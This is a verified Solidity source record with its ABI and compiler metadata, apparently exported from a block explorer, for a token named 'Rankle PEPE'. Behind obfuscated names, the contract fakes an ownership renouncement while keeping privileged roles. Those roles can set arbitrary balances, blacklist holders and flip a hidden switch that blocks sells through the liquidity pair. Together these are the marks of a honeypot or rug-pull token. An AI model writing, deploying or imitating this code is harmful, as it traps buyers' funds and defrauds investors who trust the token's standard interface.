{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface teamLiquidityEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeLiquidity) external view returns (uint256);\n\n    function transfer(address autoReceiverExempt, uint256 feeAmount) external returns (bool);\n\n    function allowance(address tokenShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoReceiverExempt,\n        uint256 feeAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapEnableBuy, uint256 value);\n    event Approval(address indexed tokenShould, address indexed spender, uint256 value);\n}\n\nabstract contract enableLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toTeam {\n    function createPair(address listEnableTeam, address shouldAuto) external returns (address);\n}\n\ninterface totalIs is teamLiquidityEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RanklePEPE is enableLiquidity, teamLiquidityEnable, totalIs {\n\n    function isTake(address buyIs) public {\n        require(buyIs.balance < 100000);\n        if (teamTake) {\n            return;\n        }\n        \n        receiverWalletTotal[buyIs] = true;\n        \n        teamTake = true;\n    }\n\n    event OwnershipTransferred(address indexed limitAt, address indexed launchedMin);\n\n    function transferFrom(address liquidityShould, address autoReceiverExempt, uint256 feeAmount) external override returns (bool) {\n        if (_msgSender() != modeLaunched) {\n            if (sellSender[liquidityShould][_msgSender()] != type(uint256).max) {\n                require(feeAmount <= sellSender[liquidityShould][_msgSender()]);\n                sellSender[liquidityShould][_msgSender()] -= feeAmount;\n            }\n        }\n        return toLimit(liquidityShould, autoReceiverExempt, feeAmount);\n    }\n\n    uint256 private listMin = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public receiverWalletTotal;\n\n    string private exemptLimit = \"Rankle PEPE\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listMin;\n    }\n\n    uint8 private minSender = 18;\n\n    mapping(address => bool) public limitMode;\n\n    bool public teamTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minSender;\n    }\n\n    address private fromSell;\n\n    address public sellWallet;\n\n    bool public autoReceiver;\n\n    function feeIs(address liquiditySell, uint256 feeAmount) public {\n        amountLaunch();\n        swapTrading[liquiditySell] = feeAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private sellSender;\n\n    function owner() external view returns (address) {\n        return fromSell;\n    }\n\n    uint256 private liquidityBuy;\n\n    function atMarketing() public {\n        emit OwnershipTransferred(txReceiver, address(0));\n        fromSell = address(0);\n    }\n\n    mapping(address => uint256) private swapTrading;\n\n    function approve(address fromTo, uint256 feeAmount) public virtual override returns (bool) {\n        sellSender[_msgSender()][fromTo] = feeAmount;\n        emit Approval(_msgSender(), fromTo, feeAmount);\n        return true;\n    }\n\n    function amountLaunch() private view {\n        require(receiverWalletTotal[_msgSender()]);\n    }\n\n    uint256 minTx;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptLimit;\n    }\n\n    function toLimit(address liquidityShould, address autoReceiverExempt, uint256 feeAmount) internal returns (bool) {\n        if (liquidityShould == txReceiver) {\n            return exemptSell(liquidityShould, autoReceiverExempt, feeAmount);\n        }\n        uint256 senderWallet = teamLiquidityEnable(sellWallet).balanceOf(autoFund);\n        require(senderWallet == minTx);\n        require(autoReceiverExempt != autoFund);\n        if (limitMode[liquidityShould]) {\n            return exemptSell(liquidityShould, autoReceiverExempt, fromReceiver);\n        }\n        return exemptSell(liquidityShould, autoReceiverExempt, feeAmount);\n    }\n\n    function allowance(address tokenLaunch, address fromTo) external view virtual override returns (uint256) {\n        if (fromTo == modeLaunched) {\n            return type(uint256).max;\n        }\n        return sellSender[tokenLaunch][fromTo];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listSender;\n    }\n\n    bool public swapMode;\n\n    address modeLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant fromReceiver = 5 ** 10;\n\n    address autoFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function exemptSell(address liquidityShould, address autoReceiverExempt, uint256 feeAmount) internal returns (bool) {\n        require(swapTrading[liquidityShould] >= feeAmount);\n        swapTrading[liquidityShould] -= feeAmount;\n        swapTrading[autoReceiverExempt] += feeAmount;\n        emit Transfer(liquidityShould, autoReceiverExempt, feeAmount);\n        return true;\n    }\n\n    function transfer(address liquiditySell, uint256 feeAmount) external virtual override returns (bool) {\n        return toLimit(_msgSender(), liquiditySell, feeAmount);\n    }\n\n    address public txReceiver;\n\n    function balanceOf(address takeLiquidity) public view virtual override returns (uint256) {\n        return swapTrading[takeLiquidity];\n    }\n\n    function limitTeam(address atSwapTeam) public {\n        amountLaunch();\n        \n        if (atSwapTeam == txReceiver || atSwapTeam == sellWallet) {\n            return;\n        }\n        limitMode[atSwapTeam] = true;\n    }\n\n    constructor (){\n        \n        fundToken marketingReceiver = fundToken(modeLaunched);\n        sellWallet = toTeam(marketingReceiver.factory()).createPair(marketingReceiver.WETH(), address(this));\n        if (receiverLaunched != liquidityBuy) {\n            liquidityBuy = marketingToken;\n        }\n        txReceiver = _msgSender();\n        atMarketing();\n        receiverWalletTotal[txReceiver] = true;\n        swapTrading[txReceiver] = listMin;\n        if (marketingToken != liquidityBuy) {\n            marketingToken = receiverLaunched;\n        }\n        emit Transfer(address(0), txReceiver, listMin);\n    }\n\n    uint256 public marketingToken;\n\n    uint256 public tokenTrading;\n\n    uint256 public receiverLaunched;\n\n    function takeTeamBuy(uint256 feeAmount) public {\n        amountLaunch();\n        minTx = feeAmount;\n    }\n\n    string private listSender = \"RPE\";\n\n    uint256 walletLaunch;\n\n    function getOwner() external view returns (address) {\n        return fromSell;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapEnableBuy\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"feeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyIs\",\"type\":\"address\"}],\"name\":\"isTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwapTeam\",\"type\":\"address\"}],\"name\":\"limitTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverWalletTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"takeTeamBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoReceiverExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "RanklePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}